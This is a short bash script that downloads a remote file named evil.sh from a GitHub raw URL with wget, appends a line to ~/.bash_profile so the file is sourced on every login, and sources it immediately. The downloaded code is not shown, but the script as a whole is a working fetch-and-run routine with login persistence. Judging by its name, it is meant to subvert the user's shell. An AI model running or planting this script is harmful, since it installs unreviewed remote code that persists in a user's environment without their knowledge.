# This script sets evil.sh behavior to bash 
# Grab evil.sh file
wget 'https://raw.githubusercontent.com/lustered/evil.sh/master/evil.sh' -P ~/

# Append to bash profile 
echo "[[ -f ~/evil.sh ]] && . ~/evil.sh" >> ~/.bash_profile

# Source file
. ~/.bash_profile
